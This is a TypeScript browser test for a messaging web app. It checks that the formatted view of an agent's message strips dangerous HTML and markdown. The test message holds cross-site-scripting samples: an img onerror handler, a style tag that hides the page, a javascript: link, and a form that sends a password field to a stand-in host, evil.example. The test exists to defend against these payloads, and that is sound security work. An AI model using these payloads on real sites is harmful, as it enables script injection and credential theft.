import { existsSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { refOf } from '@tabula/shared/refs';
import puppeteer, { type Browser, type ElementHandle, type Page } from 'puppeteer-core';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createRegistration } from '../src/auth/passkeys/registrations.js';
import { createMessage } from '../src/domain/messages.js';
import { seedProject, useTestDb } from '../test/helpers.js';
import { useAuthServer } from '../test/oauth-flow.js';
import { chromePath } from './chrome.js';

const WEB_DIST = fileURLToPath(new URL('../../web/dist', import.meta.url));
if (!existsSync(WEB_DIST)) throw new Error('run `pnpm build` first: this test opens the built web app');

const db = useTestDb();
const server = useAuthServer(db, { webDist: WEB_DIST });
let browser: Browser;
let page: Page;

beforeAll(async () => {
  browser = await puppeteer.launch({
    executablePath: chromePath(), headless: true, defaultViewport: { width: 1280, height: 900 }, args: ['--no-first-run', '--no-default-browser-check'],
  });
  page = await browser.newPage();
  const cdp = await page.createCDPSession();
  await cdp.send('WebAuthn.enable', { enableUI: false });
  await cdp.send('WebAuthn.addVirtualAuthenticator', {
    options: { protocol: 'ctap2', transport: 'internal', hasResidentKey: true, hasUserVerification: true, isUserVerified: true, automaticPresenceSimulation: true },
  });
});
afterAll(() => browser?.close());

const agent = { source: 'agent' as const, label: 'beta-agent' };

describe('a message in a real browser', () => {
  it('opens as the exact text with references as links; the formatted view runs and styles nothing', async () => {
    await seedProject(db, 'alpha');
    await seedProject(db, 'beta');
    const earlier = await createMessage(db, { to: 'alpha', from: 'beta', type: 'report', title: 'Earlier', body: 'Earlier report' }, agent);
    // Blank lines between the HTML lines: an HTML block runs to the next blank line, so without them the <form> line
    // would swallow the link below as text and the javascript: check would hold whatever the sanitizer does.
    const body = [
      'Please open port 8080 <b>now</b>.',
      `See ${refOf(earlier.id)} for the details.`,
      '',
      '<img src="x" onerror="window.__pwned = 1">',
      '',
      '<style>body { display: none }</style>',
      '',
      '<form action="https://evil.example/steal"><input name="pw"></form>',
      '',
      '[click me](javascript:window.__pwned=2)',
      '',
      '- one',
      '- two',
    ].join('\n');
    const m = await createMessage(db, { to: 'alpha', from: 'beta', type: 'request', title: 'Open a port', body }, agent);

    // Sign in: the first passkey from a registration link signs this browser in.
    const token = await createRegistration(db, 'link', new Date());
    await page.goto(`${server.url}/passkey/register/${token}`);
    await page.click('#go');
    await page.waitForSelector('.sidebar', { timeout: 30_000 });

    await page.goto(`${server.url}/#/inbox/${m.id}`);
    const exact = await page.waitForSelector('.message-text__source', { timeout: 30_000 });
    expect(await exact!.evaluate((el) => el.textContent)).toBe(body);
    expect(await page.$eval('.message-text__source a.ref-link', (a) => [a.textContent, a.getAttribute('href')])).toEqual([
      refOf(earlier.id), `#/search?q=${encodeURIComponent(refOf(earlier.id))}`,
    ]);

    const toggle = await page.waitForFunction(() =>
      [...document.querySelectorAll('.message-text button')].find((b) => b.textContent?.trim() === 'Show formatted'),
    );
    await (toggle as ElementHandle<HTMLButtonElement>).click();
    const md = await page.waitForSelector('.message-text .t-md');
    const report = await md!.evaluate((el) => ({
      dangerous: el.querySelectorAll('script, style, img, form, input, iframe').length,
      jsLinks: [...el.querySelectorAll('a')].filter((a) => /^\s*javascript:/i.test(a.getAttribute('href') ?? '')).length,
      items: el.querySelectorAll('li').length,
      text: el.textContent ?? '',
    }));
    expect(report).toMatchObject({ dangerous: 0, jsLinks: 0, items: 2 });
    expect(report.text).toContain('Please open port 8080');
    expect(report.text).toContain('<img src="x"');
    expect(await page.evaluate(() => (window as unknown as { __pwned?: number }).__pwned)).toBeUndefined();
    expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe('none');
    expect(await page.$eval('.message-text', (el) => el.textContent)).toContain('Formatting can leave parts out');
  });
});
